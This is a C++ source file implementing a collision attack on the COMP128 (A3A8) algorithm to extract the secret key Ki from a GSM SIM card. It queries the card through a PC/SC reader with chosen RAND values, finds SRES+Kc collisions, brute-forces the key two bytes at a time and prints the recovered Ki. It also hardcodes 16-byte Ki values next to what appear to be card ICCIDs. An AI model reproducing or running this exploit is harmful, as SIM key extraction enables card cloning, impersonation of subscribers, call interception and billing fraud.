// KSIM.cpp : 定义控制台应用程序的入口点。
//
#include <iomanip>
#include <iostream>
#include <fstream>
#include <vector>
#include <set>
#include <map>
#include <algorithm>
#include <functional>
#include "stdafx.h"
#include "PCSC.h"
#include "a3a8.h"
using namespace std;

#define test
struct node
{
	BYTE rand[16];
	unsigned char simout[12];

	bool operator==(const node &m) const
	{
		if (!memcmp(this->simout,m.simout,12))
			return true;
		return false;
	}

	bool operator<(const node &m) const
	{
		if (memcmp(this->simout,m.simout,12) <0)
			return true;
		return false;
	}
};

inline BYTE BYTESWAP(BYTE x) 
{
	return x <<4 | (x >>4 & 0xF);
}

int _tmain(int argc, _TCHAR* argv[])
{

	int count=0;
	unsigned char ki[16]={0};
	BYTE rand[16]={0};

	//98681001525157756787
	unsigned char key[16] = {
		0x79, 0x13, 0x8B, 0x00, 0xB3, 0x26, 0x3F, 0x5E,
		0xEC, 0x19, 0x19, 0x73, 0x20, 0xCD, 0x7F, 0x76
	};

	////98681001180730664820
	//unsigned char key[16] = {
	//	0xD1, 0x36, 0x7C, 0xE8, 0x56, 0x88, 0xB7, 0x6A,
	//	0x52, 0x64, 0xEA, 0xA6, 0xF3, 0x6C, 0x0D, 0x91
	//};

	vector<pair<int,int>> corand;
	ifstream fin("corands.dic",ios_base::in);

	fin >> hex;
	while (!fin.eof())
	{
		pair<int,int> p;
		int tmp;
		fin >>tmp;
		p.first = tmp >> 8 & 0xFF;
		p.second = tmp & 0xFF;
		corand.push_back(p);
	}



#ifndef test
	CPCSC card;

	card.Init();

	char readers[512];

	if(card.ListReaders(readers))
	{

		//list readers
		cout <<readers <<endl;

		//select and connect reader

		if(!card.ConnectCard(readers))
			return -1;
		//unsigned char atr[256]={0};
		card.GetAtr(atr);

		//cout << atr;

		card.read4442(0xFF);

		return 0;
	}

	card.SELECT(0x7F20);
#endif

	for (int m=0;m<8;++m)
	{
		/*
		//send apdu

		card.SELECT(0x3F00);

		BYTE response[256];

		card.SELECT(0x2FE2);
		card.GET_RESPONSE(response,card.m_bySW2);
		card.READ_BINARY(response, CPCSC::RS_GetFileSize(response),0L);

		cout <<"iccid: " ;
		for (int i=0;i<10;++i)
		{
		cout <<setfill('0') <<setw(2)<< hex << (int)BYTESWAP(response[i]);
		}
		cout <<endl;



		card.SELECT(0x6F07);

		cout << CPCSC::RS_GetFileSize(response) <<endl;
		card.READ_BINARY(response, CPCSC::RS_GetFileSize(response),0L);

		cout <<"imsi: " ;
		for (int i=0;i<9;++i)
		{
		cout <<setfill('0') <<setw(2)<< hex << (int)response[i];
		}
		cout <<endl;



		cout <<"rand: " ;
		for (int i=0;i<16;++i)
		{
		cout <<setfill('0') <<setw(2)<< hex << (int)rand[i];
		}
		cout <<endl;
		*/

		set<node> hashset;
		vector<node> hashs;
		vector<node> colli;

		for (vector<pair<int,int>>::iterator i=corand.begin();i!=corand.end();i++)
		{

			node n;

			count++;

			rand[m]=i->first;
			rand[m+8]=i->second;
			memcpy(n.rand,rand,16);

#ifdef test
			A3A8(rand,key,n.simout);
#else

			if (!card.RUN_GSM_ALGORITHM(rand))
			{
				return -1;
			}
			if (!card.GET_RESPONSE(n.simout,12))
			{
				return -1;
			}			

#endif
			//cout <<"SRES+Kc: " ;
			//for (int i=0;i<12;++i)
			//{
			//	cout <<setfill('0') <<setw(2)<< hex << (int)n->simout[i];
			//}
			//cout <<endl;

			set<node>::iterator it =hashset.find(n);
			if (it!=hashset.end())
			{
				colli.push_back(n);
				colli.push_back(*it);

				cout <<"SRES+Kc: " ;
				for (int i=0;i<12;++i)
				{
					cout <<setfill('0') <<setw(2)<< hex << (int)n.simout[i];
				}
				cout <<endl;
				
				//rand[m]=it->rand[m];
				//rand[m+8]=it->rand[m+8];
				goto co;
			}
			hashset.insert(n);
		}

#ifndef test
		card.DisConnectCard();
		card.Eject();
#endif
co:

		cout << "count: " << dec << count << endl;
		//排序
		//sort(hashs.begin(),hashs.end());


		////提取碰撞
		////	unique_copy(hashs.begin(),hashs.end(),colli.begin());
		//for (vector<node>::iterator it =hashs.begin();it!=hashs.end()-1;it++)
		//{
		//	if(*it==*(it+1))
		//	{
		//		colli.push_back(*it);
		//		colli.push_back(*(it+1));
		//	}
		//}

		//输出碰撞
		for (vector<node>::iterator it =colli.begin();it!=colli.end();it++)
		{
			cout <<"rand: " ;
			for (int i=0;i<16;++i)
			{
				cout <<setfill('0') <<setw(2)<< hex << (int)it->rand[i];
			}

			cout <<"  simout: " ;
			for (int i=0;i<12;++i)
			{
				cout <<setfill('0') <<setw(2)<< hex << (int)it->simout[i];
			}
			cout <<endl;
		}

		//计算分组ki
		unsigned char akey[16]={0};
		for (int i=0;i<256;++i)
		{
			//cout <<i << endl;
			for (int j=0;j<256;++j)
			{
				akey[m]=i;
				akey[m+8]=j;

				for (vector<node>::iterator it =colli.begin();it!=colli.end();it+=2)
				{
					unsigned char *simout1 =new unsigned char[12];
					unsigned char *simout2 =new unsigned char[12];

					A3A8(it->rand,akey,simout1);
					A3A8((it+1)->rand,akey,simout2);

					if (!memcmp(simout1,simout2,12))
					{
						cout <<"rand: " ;
						for (int a=0;a<16;++a)
						{
							cout <<setfill('0') <<setw(2)<< hex << (int)it->rand[a];
						}

						cout <<"  akey: " ;
						for (int a=0;a<16;++a)
						{
							cout <<setfill('0') <<setw(2)<< hex << (int)akey[a];
						}
						cout <<endl;

						ki[m]=i;
						ki[m+8]=j;

						goto nextm;
					}
				}
			}
		}
nextm:
		;
	}


	cout <<"ki: " ;
	for (int a=0;a<16;++a)
	{
		cout <<setfill('0') <<setw(2)<< hex << (int)ki[a];
	}
	cout <<endl;

	return 0;
}

